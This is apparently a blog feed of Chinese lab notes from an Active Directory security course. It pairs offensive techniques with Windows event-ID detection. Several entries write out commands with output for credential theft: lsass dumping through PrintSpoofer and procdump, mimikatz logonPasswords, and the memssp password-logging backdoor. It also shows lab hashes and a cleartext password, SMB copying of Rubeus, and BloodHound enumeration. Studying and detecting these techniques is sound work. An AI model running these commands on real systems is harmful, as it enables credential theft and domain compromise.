[TOC]
Lecture Video: 2022/05/11 AD 安全 2 Lab 這個lab主要和之前不太一樣的地方在於都是利用SMB的功能達到遠端電腦讀寫的效果，雖然遠端執行也可以做到，但這樣會比較方便
==遠端讀寫(w/ GUI)== Open File Explorer Enter \\&lt;IP>\c$ For example: \\192.168.222.128\c$ Login Local Admin Result 我在Win10中利用上述步驟，成功讀取到Win2016的資料 ==遠端讀寫(w/o GUI)== 沒有GUI的情況就需要先掛載遠端的C槽在本地端，然後才可以進行後續的讀寫，有時候他會跳出錯誤
Cheat Sheet $ net use \\&lt;IP>\C$ "&lt;password>" /user:&lt;username> :::spoiler Result $ net use \\192.168.222.128\C$ "1qaz@WSX3edc" /user:administrator # 掛載遠端磁碟 命令已經成功完成。 $ net use # 查看已掛載的遠端磁碟 會記錄新的網路連線。 狀態 本機 遠端 網路 ------------------------------------------------------------------------------- OK \\192.168.222.128\C$ Microsoft Windows Network 命令已經成功完成。 $ copy Rubeus.exe \\192.168.222.128\C$ 複製了 1 個檔案。 可以看到Win2016的C槽中多了一個Rubeus.exe的檔案，代表成功 ::: ==How to Detect SMB Access== Event ID: 5145 預設不開，因為會有大量的event湧入，除非設定有存取c$的filter，就會少非常多，因為遠端存取c槽本身就蠻可疑的，所以偵測到非法存取的機率就蠻高的</description></item><item><title>NTUSTISC - AD Note - Lab(偵測LSASS)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x17%E5%81%B5%E6%B8%AClsass/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x17%E5%81%B5%E6%B8%AClsass/index.html</guid><description>NTUSTISC - AD Note - Lab(偵測LSASS) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background 得到更高權限之後，會想要更多的密碼
密碼收集 SAM.hive(Security Account Manager) Password Spraying(用猜的) GPO 記憶體(lsass) How to detect LSASS access? 利用Sysmon這個工具中有設定的event ID: 10，這個工具類似Event Viewer但更多元更強，下載可見Sysmon How to install? 簡單來說它需要先準備一個config file，然後安裝的時候就會一起把config設定好(每一間公司或每一個人都不一樣，算是機密) $ Sysmon64.exe -i sysmonconfig-export.xml Lab ==偵測LSASS== 利用Sysmon Event ID: 10
準備sysmonconfig 就像前面說的，每一間公司的sysmonconfig都是機密，所以我們這次的lab，講師也有準備簡易的sysmonconfig &lt;Sysmon schemaversion="4.1"> &lt;HashAlgorithm>SHA256&lt;/HashAlgorithm> &lt;EventFiltering> &lt;ProcessAccess default="include"> &lt;/ProcessAccess> &lt;/EventFiltering> &lt;/Sysmon> 安裝Sysmon 按照前面提到的指令，並把sysconfig準備好 $ Sysmon64.exe -i sysmonconfig-export.xml System Monitor v15.0 - System activity monitor By Mark Russinovich and Thomas Garnier Copyright (C) 2014-2023 Microsoft Corporation Using libxml2. libxml2 is Copyright (C) 1998-2012 Daniel Veillard. All Rights Reserved. Sysinternals - www.sysinternals.com Loading configuration file with schema version 4.10 Sysmon schema version: 4.90 :::warning 實作中這邊遇到問題，理論上準備好sysmonconfig之後下command應該會安裝，但他只跑到一半就結束了，不確定是不是因為沒有連網還是其他設定沒有做好，總之，sysmon算是不能用了，所以之後還有其他的lab會用到就只能跳過 ::: Skip</description></item><item><title>NTUSTISC - AD Note - Lab(偵測密碼揮灑)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x15%E5%81%B5%E6%B8%AC%E5%AF%86%E7%A2%BC%E6%8F%AE%E7%81%91/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x15%E5%81%B5%E6%B8%AC%E5%AF%86%E7%A2%BC%E6%8F%AE%E7%81%91/index.html</guid><description>NTUSTISC - AD Note - Lab(偵測密碼揮灑) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background 得到更高權限之後，會想要更多的密碼
密碼收集 SAM.hive(Security Account Manager) Password Spraying(用猜的) 和brute force差在哪裡呢?其實概念一樣，只是角度不一樣，brute force是針對一隻帳號，用很多的密碼去猜；而password spraying則是用一組密碼去爆所有的帳號，其實就是反過來 Tool: CrackMapExec - 結合各種功能的內網滲透神器 GPO 記憶體(lsass) Lab ==Lab: How to detect Password Spraying== 利用Event ID: 4625, 4648, 4771的認證失敗紀錄 可以看到我是大約在4:52:08左右執行的，有一大堆的4625紀錄，如果抓最後一筆的紀錄，會顯示Account Name就是我們在Kali看到的最後一個帳戶，而且Keyword顯示Audit Failure</description></item><item><title>NTUSTISC - AD Note - Lab(偵測提權)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x11%E5%81%B5%E6%B8%AC%E6%8F%90%E6%AC%8A/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x11%E5%81%B5%E6%B8%AC%E6%8F%90%E6%AC%8A/index.html</guid><description>NTUSTISC - AD Note - Lab(偵測提權) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background 提權方法 利用弱點 Hijack Token Guess Password 管理服務 錯誤配置 Lab Time - 本地提權 ==偵測Network Service提權== 利用Event ID: 4624
類型: 5 虛擬帳戶: 是 提高權限的權杖: 是 這樣的rule會有高機率命中，但經過實測會發現他不會顯示出類型5和虛擬帳戶為是的event，只有類型3會被顯示出來，如下圖</description></item><item><title>NTUSTISC - AD Note - Lab(偵測查詢的操作)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x05%E5%81%B5%E6%B8%AC%E6%9F%A5%E8%A9%A2%E7%9A%84%E6%93%8D%E4%BD%9C/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x05%E5%81%B5%E6%B8%AC%E6%9F%A5%E8%A9%A2%E7%9A%84%E6%93%8D%E4%BD%9C/index.html</guid><description>NTUSTISC - AD Note - Lab(偵測查詢的操作) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Lab Time - 環境調查 ==Lab - How to observe they’ve audited the record?== 像前面說的，如果在群組的user要觀察ad的name, description之類的，要如何觀察到他們正在做的事情?可以利用==Windows Event ID: 4662==，這個event ID會針對所有user對LDAP的查詢進行log，這樣不管是誰進行查詢都會留下紀錄，但是事先要啟用(預設不開)
GPO(Group Policy Object)啟動相關事件稽核 在Win2016一開機會啟動Server Manager，其中的Tools/Group Policy Management 點選進去後在Forest:kuma.org/Domains/kuma.org/Default Domain Policy按右鍵選取Edit就會看到==Group Policy Management Editor== 接著在Group Policy Management Editor/Computer Configuration/Policies/Windows Settings/Security Settings/Local Policies/Audit Policy中可以找到==Audit directory service access Properties==，勾選起來就可以了</description></item><item><title>NTUSTISC - AD Note - Lab(其他方法得到lsass.dmp)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x18%E5%85%B6%E4%BB%96%E6%96%B9%E6%B3%95%E5%BE%97%E5%88%B0lsass.dmp/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x18%E5%85%B6%E4%BB%96%E6%96%B9%E6%B3%95%E5%BE%97%E5%88%B0lsass.dmp/index.html</guid><description>NTUSTISC - AD Note - Lab(其他方法得到lsass.dmp) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background 有了Mimikatz也不一定能夠用，因為Windows的defender也知道這是個好用的東西，對於攻擊方而言，所以會盡可能的直接刪除，那要怎麼bypass或用其他方法把LSASS帶走?
Lab ==Take LSASS with other ways== 方法一 在windows工作管理員中，找到Local Security Authority Process(LSASS)，右鍵選==建立傾印檔案==，就可以直接dump memory，然後再把這一份檔案丟到自己可以開mimikatz的電腦，就可以分析了，會有一樣的效果 方法二 如果沒有GUI的話，也可以考慮直接使用Procdump，當然你必須要取得足夠的權限，要不就是用前面提到的IIS提權執行指令，不然就直接切換administrator帳戶，我是用前者 Command: c:\tools\PrintSpoofer64.exe -c "c:\windows\system32\cmd.exe /c c:\tools\Procdump\procdump.exe -accepteula -ma lsass.exe lsass.dmp > c:\inetpub\wwwroot\tmp.txt" 可以看到它放在C:\Windows\system32\lsass.dmp中
透過Minidump獲取資訊 有了前面的lsass.dmp，就可以繼續使用mimikatz得到一些有用的資訊，只是，指令稍微有點不太一樣，因為我們不用對lsass進行debug
$ Sekurlsa::minidump "&lt;path to lsass.dmp>" $ Sekurlsa::logonPasswords :::spoiler Result</description></item><item><title>NTUSTISC - AD Note - Lab(利用弱點)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x09%E5%88%A9%E7%94%A8%E5%BC%B1%E9%BB%9E/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x09%E5%88%A9%E7%94%A8%E5%BC%B1%E9%BB%9E/index.html</guid><description>NTUSTISC - AD Note - Lab(利用弱點) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background Internet Information Services(IIS) IIS是縮寫，全稱Internet Information Services ( IIS,互聯網信息服務 ),是由微軟公司提供的基於運行Microsoft Windows的互聯網基本服務。
IIS是指World Wide Web server服務，IIS是一種Web（網頁）服務組件，專業的說，IIS可以賦予一部主機電腦一組以上的IP地址，而且還可以有一個以上的域名作為Web網站。做過服務器配置的都應該知道IIS。制作好了網站怎麽才能讓別人瀏覽，就是通過網站服務器來實現的。IIS只是網站服務器的一種而已。
簡單來說： Internet Information Service（IIS）是windows開設web網頁服務的組件，用來搭載網站運行程序的平台的。還能提供FTP，SMTP等服務。
在UNIX或Linux平台上，Apache就是網站服務器。
而對於Windows NT/2000來說，IIS就是標準的網站服務器。
IIS是一種服務，是Windows 2000 Server系列的一個組件。不同於一般的應用程序，它就像驅動程序一樣是操作系統的一部分，具有在系統啟動時被同時啟動的服務功能。 如果想知道如何在win10啟用IIS或是建置網站server，可以看這個影片1
一般權限(就像前面的lab那樣) 取得網域使用者資訊 Scan Port Check Group Policy Object 高權限好處 Dump Password or Hash Turn off Defender Check the other users’ info 本地特出使用者 ==NT Authority\System==(本地端真正的最高權限使用者) NT Authority\Network Service NT Authority\Local Service NT Authority\IUSR 提權方法 利用弱點(通常是直接用Windows CVE直接打看看)，可參考2 Hijack Token Guess Password 就像前面環境觀察中提到的一樣，可以從Active Directory Users and Computers的description中看看有沒有密碼的提示，或是查看$ net user變更密碼的時間是哪時候，然後考慮爆破 Local Admin比Domain Admin好拿 通常是固定密碼 所有主機都相同 可能很多人知道 弱密碼 系統初始化包 Solution: 可以參考本機系統管理員密碼解決方案(LAPS) 管理服務 錯誤配置 Lab Time - 本地提權 ==利用弱點== $ git clone https://github.com/bitsadmin/wesng.git --depth 1 $ cd wesng $ python wes.py --update $ systeminfo.exe > systeminfo.txt # 這條指令是windows內建的指令，所以一定要在cmd中操作 $ python wes.py systeminfo.txt :::spoiler Result</description></item><item><title>NTUSTISC - AD Note - Lab(查詢本地使用者)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x02%E6%9F%A5%E8%A9%A2%E6%9C%AC%E5%9C%B0%E4%BD%BF%E7%94%A8%E8%80%85/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x02%E6%9F%A5%E8%A9%A2%E6%9C%AC%E5%9C%B0%E4%BD%BF%E7%94%A8%E8%80%85/index.html</guid><description>NTUSTISC - AD Note - Lab(查詢本地使用者) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Lab Time - 環境調查 ==查詢本地使用者== 常用的cheat sheet
$ net user $ net user &lt;username> :::spoiler Implementation
$ net user \\DESKTOP-G95U93T 的使用者帳戶 ------------------------------------------------------------------------------- Administrator DefaultAccount Guest low user WDAGUtilityAccount 命令已經成功完成。 $ net user administrator 使用者名稱 Administrator 全名 註解 管理電腦/網域的內建帳戶 使用者的註解 國家/區域碼 000 (系統預設值) 帳戶使用中 Yes 帳戶到期 從不 上次設定密碼 ‎2021/‎9/‎28 下午 10:10:39 密碼到期 從不 可變更密碼 ‎2021/‎9/‎28 下午 10:10:39 請輸入密碼 Yes 使用者可以變更密碼 Yes 容許的工作站 全部 登入指令檔 使用者設定檔 主目錄 上次登入時間 ‎2023/‎8/‎26 上午 12:48:36 可容許的登入時數 全部 本機群組會員 *Administrators 全域群組會員 *None 命令已經成功完成。 :::</description></item><item><title>NTUSTISC - AD Note - Lab(查詢網域群組)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x06%E6%9F%A5%E8%A9%A2%E7%B6%B2%E5%9F%9F%E7%BE%A4%E7%B5%84/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x06%E6%9F%A5%E8%A9%A2%E7%B6%B2%E5%9F%9F%E7%BE%A4%E7%B5%84/index.html</guid><description>NTUSTISC - AD Note - Lab(查詢網域群組) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Lab Time - 環境調查 ==查詢網域群組== 常用的cheat sheet Domain Admins, Schema Admins, Enterprise Admins是預設的權限，通常一進到AD網域都會先看這幾個權限有哪些成員
$ net groups /domain # 查詢網域中群組的資料 $ net groups "Domain Admins" /domain $ net groups "Schema Admins" /domain $ net groups "Enterprise Admins" /domain :::spoiler Implementation
$ net groups /domain 這項要求會在網域 kuma.org 下的網域控制站處理。 \\WIN-818G5VCOLJO.kuma.org 的群組帳戶 ------------------------------------------------------------------------------- *accounting *Cloneable Domain Controllers *DnsUpdateProxy *Domain Admins *Domain Computers *Domain Controllers *Domain Guests *Domain Users *Enterprise Admins *Enterprise Key Admins *Enterprise Read-only Domain Controllers *Executives *Group Policy Creator Owners *IT Admins *Key Admins *marketing *Office Admin *Project management *Protected Users *Read-only Domain Controllers *sales *Schema Admins *Senior management 命令已經成功完成。 $ net groups "Domain Admins" /domain 這項要求會在網域 kuma.org 下的網域控制站處理。 群組名稱 Domain Admins 註解 Designated administrators of the domain 成員 ------------------------------------------------------------------------------- Administrator 命令已經成功完成。 $ net groups "Schema Admins" /domain 這項要求會在網域 kuma.org 下的網域控制站處理。 群組名稱 Schema Admins 註解 Designated administrators of the schema 成員 ------------------------------------------------------------------------------- Administrator 命令已經成功完成。 $ net groups "Enterprise Admins" /domain 這項要求會在網域 kuma.org 下的網域控制站處理。 群組名稱 Enterprise Admins 註解 Designated administrators of the enterprise 成員 ------------------------------------------------------------------------------- Administrator 命令已經成功完成。 可以看到目前這三個預設的群組，都只有Administrator在裡面而已 :::</description></item><item><title>NTUSTISC - AD Note - Lab(無法Reboot的時盜取Passwd)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x20%E7%84%A1%E6%B3%95reboot%E7%9A%84%E6%99%82%E7%9B%9C%E5%8F%96passwd/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x20%E7%84%A1%E6%B3%95reboot%E7%9A%84%E6%99%82%E7%9B%9C%E5%8F%96passwd/index.html</guid><description>NTUSTISC - AD Note - Lab(無法Reboot的時盜取Passwd) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background 如果遇到不能重開機的狀況，要怎麼前面提到的明文密碼呢?可以利用MEMSSP，它也是mimikatz設計的一個小後門，只要提升debug權限，再注入這個後門，之後等其他人登入到此主機，就可以被這個後門記錄起來
Lab ==無法Reboot的時盜取Passwd== Inject memssp 記得用系統管理員權限開mimikatz mimikatz # privilege::debug Privilege '20' OK mimikatz # misc::memssp Injected =) Relogin 重新登出再登入才會看到 Result 在C:\Windows\System32\mimilsa.log [00000000:001f7c0f] kuma\DESKTOP-G95U93T$	maj"2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF [00000000:001f7c0f] kuma\DESKTOP-G95U93T$	maj"2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF [00000000:001f80d1] kuma\DESKTOP-G95U93T$	maj"2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF [00000000:001f80d1] kuma\DESKTOP-G95U93T$	maj"2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF [00000000:001f80e8] kuma\DESKTOP-G95U93T$	maj"2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF [00000000:001f80e8] kuma\DESKTOP-G95U93T$	maj"2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF [00000000:001fc7f9] kuma\bear	1qaz@WSX3edc [00000000:001fc7f9] kuma\bear	1qaz@WSX3edc [00000000:001fc85a] kuma\bear	1qaz@WSX3edc [00000000:001fc85a] kuma\bear	1qaz@WSX3edc [00000000:001fc7f9] kuma\bear	1qaz@WSX3edc [00000000:001fc7f9] kuma\bear	1qaz@WSX3edc 可以看到這個log file用明文的方式新增了我們剛剛打入的密碼 ==How to detect it?== 一樣是用Sysmon的Event ID: 11可以知道，但因為之前安裝不成功所以只能Skip，不過原理就是他是去偵測lsass.exe建立mimilsa.log的瞬間</description></item><item><title>NTUSTISC - AD Note - Lab(環境調查BloodHound)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x08%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5bloodhound/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x08%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5bloodhound/index.html</guid><description>NTUSTISC - AD Note - Lab(環境調查BloodHound) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background [Windows Programming] IPC 通知機制與安全設定
當系統中需要同步處理某些資源的存取權時，可以使用 Windows 的同步處理物件協調不同 process 間對於共同資源的互動，Windows 提供的同步處理物件有四種，分別是: Event, Mutex, Semaphore, Waitable timer，本篇只會提到 Event 喔！
假設系統中有兩個 process：process A 得等待 process B 完成某些特定工作後才能繼續執行。windows 提供的 event 機制能讓 process B 完成工作後發出訊號通知 process A，而 process A 則進入等待狀態直到接受到訊號後才繼續執行後續工作。Process 間只需定好溝通的 event name 就可以輕鬆達成跨程序間的通訊 (Inter-process communication : IPC)，正因為簡單好實現的特性，event 常被用在程序間的溝通與同步。
Lab Time - 環境調查 BloodHound AD 說明: 環境調查的視覺化工具 版本: 4.0.3 :::info 8/29更新：經過實測還是建議使用4.1.0，詳細原因可以參考1，原作者說明這是一個bug，已在4.1.0做了修正，所以還是以4.1.0為主，雖然聽講師說可能會少東西，不過對我們小專案來說應該沒差 ::: Link: BloodHound GitHub 必要條件: 必須裝設Neo4j Server / Graph Database, 而且必須要是community version，link Download Collector BloodHound是一個環境調查的視覺化工具，所以要先在我們的環境先蒐集一些環境上的資訊，再導入到BloodHound中進行分析，因此我們應該先下載能夠蒐集環境資訊的Collector我是直接把整包clone下來，然後用隨身碟傳到VM(因為那時候Win10已經加入AD，我懶得改回來上網) :::info Note: Windows的defender會擋BloodHound-master/Collectors/SharpHound.exe和SharpHound.ps1這兩個files，所以記得關掉defender ::: Use the Collector First :::info Note: 記得要用bear的網域帳號登入，SharpHound.exe才找的到LDAP ::: CMD直接進入C:\tools\BloodHound-master\Collectors，然後直接執行$ SharpHound.exe :::spoiler Implementation $ SharpHound.exe 2023-08-29T11:02:31.4846421+08:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound 2023-08-29T11:02:31.6707467+08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote 2023-08-29T11:02:31.6985917+08:00|INFORMATION|Initializing SharpHound at 上午 11:02 on 2023/8/29 2023-08-29T11:02:31.9891653+08:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for kuma.org : WIN-818G5VCOLJO.kuma.org 2023-08-29T11:02:32.3820391+08:00|INFORMATION|Loaded cache with stats: 163 ID to type mappings. 163 name to SID mappings. 1 machine sid mappings. 2 sid to domain mappings. 0 global catalog mappings. 2023-08-29T11:02:32.3915435+08:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote 2023-08-29T11:02:32.6206999+08:00|INFORMATION|Beginning LDAP search for kuma.org 2023-08-29T11:02:32.8062803+08:00|INFORMATION|Producer has finished, closing LDAP channel 2023-08-29T11:02:32.8230625+08:00|INFORMATION|LDAP channel closed, waiting for consumers 2023-08-29T11:03:03.3930708+08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 42 MB RAM 2023-08-29T11:03:13.1743544+08:00|INFORMATION|Consumers finished, closing output channel Closing writers 2023-08-29T11:03:13.2209345+08:00|INFORMATION|Output channel closed, waiting for output task to complete 2023-08-29T11:03:13.3058132+08:00|INFORMATION|Status: 204 objects finished (+204 5.1)/s -- Using 44 MB RAM 2023-08-29T11:03:13.3058132+08:00|INFORMATION|Enumeration finished in 00:00:40.6864986 2023-08-29T11:03:13.3918361+08:00|INFORMATION|Saving cache with stats: 163 ID to type mappings. 163 name to SID mappings. 1 machine sid mappings. 2 sid to domain mappings. 0 global catalog mappings. 2023-08-29T11:03:13.4075189+08:00|INFORMATION|SharpHound Enumeration Completed at 上午 11:03 on 2023/8/29! Happy Graphing! ::: 理論上成功的話，會在該folder中出現一個.zip file with name &lt;TimeStamp>.BloodHound.zip此時按照之前啟動BloodHound的方法啟動BloodHound，然後把zip folder拖進去就可以了 ==如何偵測AD== 有兩種方法，也可以同時使用</description></item><item><title>NTUSTISC - AD Note - Lab(當前網域控制站(DC))</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x07%E7%95%B6%E5%89%8D%E7%B6%B2%E5%9F%9F%E6%8E%A7%E5%88%B6%E7%AB%99dc/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x07%E7%95%B6%E5%89%8D%E7%B6%B2%E5%9F%9F%E6%8E%A7%E5%88%B6%E7%AB%99dc/index.html</guid><description>NTUSTISC - AD Note - Lab(當前網域控制站(DC)) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Lab Time - 環境調查 情報蒐集：==當前網域控制站(DC)== 以駭客的角度來說，如果已經連到AD中，要怎麼知道目前DC是誰 常用的cheat sheet
$ echo %logonserver% $ nltest /dclist:&lt;domain> :::spoiler Implementation
$ echo %logonserver% \\WIN-818G5VCOLJO $ nltest /dclist:kuma.org 取得網域 'kuma.org' (從 '\\WIN-818G5VCOLJO.kuma.org') 中的 DC 清單。 WIN-818G5VCOLJO.kuma.org [PDC] [DS] 站台: Default-First-Site-Name 命令成功完成 從Win10當中下指令的確可以知道Win2016的PC Name是WIN-818G5VCOLJO :::</description></item><item><title>NTUSTISC - AD Note - Lab(透過Mimikatz取得Local Admin的NTLM)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x16%E9%80%8F%E9%81%8Emimikatz%E5%8F%96%E5%BE%97local-admin%E7%9A%84ntlm/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x16%E9%80%8F%E9%81%8Emimikatz%E5%8F%96%E5%BE%97local-admin%E7%9A%84ntlm/index.html</guid><description>NTUSTISC - AD Note - Lab(透過Mimikatz取得Local Admin的NTLM) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background 得到更高權限之後，會想要更多的密碼
密碼收集 SAM.hive(Security Account Manager) Password Spraying(用猜的) GPO Where: \\&lt;domain>\SysVol\&lt;domain>\Policie，以本次實驗為例，就是放在\\kuma.org\SYSVOL\kuma.org\Policies，接下來就是隨機生成的&lt;UID>\Users\Scripts和&lt;UID>\Machine\Scripts，這兩個腳本是我們覺得重要的 記憶體(lsass) 為了獲取更多其他帳號密碼，嘗試逼近Domain Admin，可以使用Mimikatz獲取暫存憑證 ==What is Mimikatz?== Mimikatz為一個強力的Windows提權工具，可以提升Process權限、注入Process讀取Process記憶體，可以直接從lsass中獲取當前登錄過系統用戶的帳號明文密碼。 lsass是微軟Windows系統的安全機制它主要用於本地安全和登陸策略，通常我們在登陸系統時輸入密碼之後，密碼便會儲存在lsass內存中，經過其wdigest和tspkg兩個模塊調用後，對其使用可逆的算法進行加密並存儲在內存之中，而mimikatz正是通過對lsass的逆算獲取到明文密碼。 簡單說就是所有登入認證都交給lsass，所以他有所有人的認證憑證
Download: Mimikatz-github How to use: Mimikatz最新版本一共三個文件(mimilib.dll、mimikatz.exe、mimidrv.sys)，分為Win32位(多了一個mimilove.exe文件)和X64位 下載後解壓縮即可使用，裡面分為Win32和X64，Win32是針對Windows32位，而X64是針對64位作業系統，目前絕大部分作業系統為64位 ==lsass.exe VS SAM== SAM只會存取本地用戶的NTLM Hash，而lsass.exe是只要有存取過目前電腦的使用者都會被記錄，例如domain admin或是其他使用者利用smb連過來也會被lsass紀錄 Lab ==透過Mimikatz取得Local Admin的NTLM== Activate Mimikatz 進入C:\tools\mimikatz_trunk\x64右鍵以系統管理員身分執行mimikatz.exe(一定要用系統管理員才能執行提權的debug) 起手式 mimikatz # Privilege::Debug Privilege '20' OK mimikatz # log Using 'mimikatz.log' for logfile : OK mimikatz # Sekurlsa::logonPasswords :::spoiler Log Reuslt Using 'mimikatz.log' for logfile : OK mimikatz # Sekurlsa::logonPasswords Authentication Id : 0 ; 23133312 (00000000:0160fc80) Session : CachedInteractive from 1 User Name : Administrator Domain : kuma Logon Server : WIN-818G5VCOLJO Logon Time : 2023/9/4 06:07:18 SID : S-1-5-21-306106713-2531972042-334329499-500 msv :	[00000003] Primary * Username : Administrator * Domain : kuma * NTLM : 7ecffff0c3548187607a14bad0f88bb1 * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0 * DPAPI : cf967ea9c9c0f9d58b79fdd040270648 tspkg :	wdigest :	* Username : Administrator * Domain : kuma * Password : (null) kerberos :	* Username : Administrator * Domain : KUMA.ORG * Password : 1qaz@WSX3edc ssp :	credman :	cloudap :	Authentication Id : 0 ; 20047794 (00000000:0131e7b2) Session : 